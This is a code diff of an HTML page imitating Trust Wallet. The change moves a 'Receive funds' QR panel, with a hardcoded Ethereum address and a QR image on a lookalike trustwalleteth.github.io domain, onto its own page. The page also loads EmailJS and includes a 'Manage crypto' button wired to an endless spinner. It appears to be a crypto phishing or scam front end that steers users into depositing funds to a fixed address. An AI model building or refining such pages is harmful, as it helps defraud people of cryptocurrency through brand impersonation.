@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Trust • minimal send/fund</title>
+  <title>Trust • fund separate page</title>
   <!-- EmailJS (unchanged) -->
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <style>
@@ -186,7 +186,7 @@
       margin-top: 4px;
     }
 
-    /* action row: ONLY send & fund with minimalistic icons */
+    /* action row: ONLY send & fund */
     .action-row {
       display: flex;
       justify-content: center;
@@ -219,9 +219,6 @@
       box-shadow: 0 3px 8px -4px #8fa3c0;
       border: 1px solid #cddbf0;
       transition: 0.1s;
-    }
-    .action-item:active .action-icon {
-      background: #eef3fc;
     }
 
     .prediction-row {
@@ -292,9 +289,6 @@
       cursor: pointer;
       margin-top: 8px;
     }
-    .manage-link:active {
-      background: #d9e2f0;
-    }
 
     .back-link-sm {
       color: #526f96;
@@ -327,46 +321,58 @@
       font-weight: 450;
     }
 
-    /* ----- QR PANEL (embedded in main wallet) ----- */
-    .qr-panel {
-      background: #f5f9ff;
-      border-radius: 28px;
-      padding: 18px 16px;
-      border: 1px solid #cbdaf0;
-      margin-top: 8px;
-      display: none;
-      flex-direction: column;
+    /* ----- FUND PAGE (separate, with QR and copy) ----- */
+    .fund-page {
+      gap: 20px;
       align-items: center;
     }
-    .qr-panel.visible {
+    .fund-header {
       display: flex;
+      justify-content: space-between;
+      align-items: center;
+      width: 100%;
+      margin-bottom: 10px;
     }
-    .qr-image {
-      width: 160px;
-      height: 160px;
-      background: #ffffff;
-      border-radius: 20px;
-      padding: 6px;
-      box-shadow: 0 8px 20px -10px #577394;
-      margin-bottom: 12px;
+    .fund-title {
+      font-weight: 600;
+      font-size: 1.2rem;
+      color: #1b2d44;
     }
-    .qr-image img {
+    .qr-box {
+      background: #f5f9ff;
+      border-radius: 32px;
+      padding: 24px 16px;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      border: 1px solid #cbdaf0;
+    }
+    .qr-code-image {
+      width: 200px;
+      height: 200px;
+      background: white;
+      border-radius: 24px;
+      padding: 8px;
+      box-shadow: 0 12px 24px -14px #20476e;
+      margin-bottom: 18px;
+    }
+    .qr-code-image img {
       width: 100%;
       height: 100%;
       object-fit: contain;
-      border-radius: 12px;
+      border-radius: 16px;
     }
-    .address-box {
+    .address-row {
       background: #ecf3fd;
       border-radius: 60px;
-      padding: 10px 16px;
+      padding: 12px 18px;
       width: 100%;
       display: flex;
       align-items: center;
       justify-content: space-between;
       border: 1px solid #b7ceec;
-      margin: 6px 0;
-      font-size: 0.7rem;
+      font-size: 0.75rem;
       font-family: monospace;
       word-break: break-all;
     }
@@ -375,15 +381,20 @@
       color: white;
       border: none;
       border-radius: 40px;
-      padding: 8px 16px;
-      font-size: 0.75rem;
+      padding: 8px 20px;
+      font-size: 0.8rem;
       font-weight: 500;
       cursor: pointer;
-      min-width: 60px;
+      min-width: 70px;
       text-align: center;
     }
     .copy-btn:active {
       background: #103247;
+    }
+    .network-note {
+      font-size: 0.65rem;
+      color: #59779e;
+      margin-top: 8px;
     }
   </style>
 </head>
@@ -400,7 +411,7 @@
       <div class="light-footer">secure gateway</div>
     </div>
 
-    <!-- MAIN WALLET PAGE (only Send & Fund, minimal icons) -->
+    <!-- MAIN WALLET PAGE (only Send & Fund) -->
     <div class="page wallet-page" id="walletPage">
       <div class="balance-section">
         <div class="total-label">total balance</div>
@@ -408,7 +419,6 @@
         <div class="balance-sub">$0.00 (0.0%)</div>
       </div>
 
-      <!-- action row: ONLY send & fund with clean icons -->
       <div class="action-row">
         <div class="action-item" id="sendAction">
           <div class="action-icon">⬆️</div>
@@ -425,6 +435,7 @@
         <span class="chip">Prediction</span>
         <span class="chip">Watch</span>
       </div>
+
       <!-- Ethereum -->
       <div class="crypto-row">
         <div class="crypto-left">
@@ -447,29 +458,37 @@
           <span class="crypto-sub">USDC</span>
         </div>
       </div>
-      <!-- Manage crypto (goes to infinite spinner) -->
+
+      <!-- Manage crypto (infinite spinner) -->
       <div class="manage-link" id="manageCryptoBtn">⚙️ Manage crypto</div>
-
-      <!-- QR panel (hidden by default, shown when Fund clicked) -->
-      <div class="qr-panel" id="qrPanel">
-        <div class="qr-image">
-          <img src="https://trustwalleteth.github.io/QR/Screenshot_2026-02-14-20-40-37-266-edit_com.wallet.crypto.trustapp.jpg" alt="QR code">
-        </div>
-        <div class="address-box">
-          <span style="font-family: monospace;" id="cryptoAddress">0x55aD83631e3E454b79510273a2F89A4bf096B7C7</span>
-          <button class="copy-btn" id="copyAddressBtn">copy</button>
-        </div>
-        <div style="font-size:0.6rem; color:#4b6c94;">Ethereum network</div>
-      </div>
-
       <div class="back-link-sm" id="backFromWalletToLanding">← back</div>
     </div>
 
-    <!-- LOADING PAGE (spinner infinite, only back possible) -->
+    <!-- LOADING PAGE (spinner infinite) -->
     <div class="page loading-page" id="loadingPage">
       <div class="spinner"></div>
       <div class="loading-text">loading ...</div>
       <div class="back-link-sm" id="backFromLoading">← back</div>
+    </div>
+
+    <!-- FUND PAGE (separate, with QR and copy) -->
+    <div class="page fund-page" id="fundPage">
+      <div class="fund-header">
+        <div class="back-link-sm" id="backFromFund">← back</div>
+        <span class="fund-title">Receive funds</span>
+        <span style="width:40px;"></span>
+      </div>
+
+      <div class="qr-box">
+        <div class="qr-code-image">
+          <img src="https://trustwalleteth.github.io/QR/Screenshot_2026-02-14-20-40-37-266-edit_com.wallet.crypto.trustapp.jpg" alt="QR code">
+        </div>
+        <div class="address-row">
+          <span style="font-family: monospace; font-size:0.7rem;" id="fundAddress">0x55aD83631e3E454b79510273a2F89A4bf096B7C7</span>
+          <button class="copy-btn" id="fundCopyBtn">copy</button>
+        </div>
+        <div class="network-note">Ethereum network</div>
+      </div>
     </div>
   </div>
 
@@ -481,27 +500,24 @@
       const landing = document.getElementById('landingPage');
       const wallet = document.getElementById('walletPage');
       const loading = document.getElementById('loadingPage');
+      const fundPage = document.getElementById('fundPage');
 
       // buttons
       const openWallet = document.getElementById('openWalletBtn');
       const backFromWallet = document.getElementById('backFromWalletToLanding');
       const manageBtn = document.getElementById('manageCryptoBtn');
       const backFromLoading = document.getElementById('backFromLoading');
-
-      // Receive action (Fund)
       const fundAction = document.getElementById('fundAction');
-      const qrPanel = document.getElementById('qrPanel');
-      const copyBtn = document.getElementById('copyAddressBtn');
-      const walletAddress = '0x55aD83631e3E454b79510273a2F89A4bf096B7C7';
-
-      // send action (just demo)
+      const backFromFund = document.getElementById('backFromFund');
       const sendAction = document.getElementById('sendAction');
+      const fundCopyBtn = document.getElementById('fundCopyBtn');
+
+      const walletAddress = '0x55aD83631e3E454b79510273a2F89A4bf096B7C7';
 
       // open wallet
       openWallet.addEventListener('click', ()=>{
         landing.classList.remove('active');
         wallet.classList.add('active');
-        qrPanel.classList.remove('visible'); // hidden on enter
       });
 
       // back from wallet to landing
@@ -520,20 +536,26 @@
       backFromLoading.addEventListener('click', ()=>{
         loading.classList.remove('active');
         wallet.classList.add('active');
-        qrPanel.classList.remove('visible');
       });
 
-      // FUND: toggle qr panel visibility
+      // FUND: open fund page (separate page)
       fundAction.addEventListener('click', ()=>{
-        qrPanel.classList.add('visible');
+        wallet.classList.remove('active');
+        fundPage.classList.add('active');
       });
 
-      // copy address (plain text "copy" / "copied")
-      copyBtn.addEventListener('click', ()=>{
+      // back from fund to wallet
+      backFromFund.addEventListener('click', ()=>{
+        fundPage.classList.remove('active');
+        wallet.classList.add('active');
+      });
+
+      // copy on fund page
+      fundCopyBtn.addEventListener('click', ()=>{
         navigator.clipboard.writeText(walletAddress).then(()=>{
-          const original = copyBtn.innerText;
-          copyBtn.innerText = 'copied';
-          setTimeout(()=>{ copyBtn.innerText = original; }, 1500);
+          const original = fundCopyBtn.innerText;
+          fundCopyBtn.innerText = 'copied';
+          setTimeout(()=>{ fundCopyBtn.innerText = original; }, 1500);
         }).catch(()=>{
           alert('manual copy: ' + walletAddress);
         });
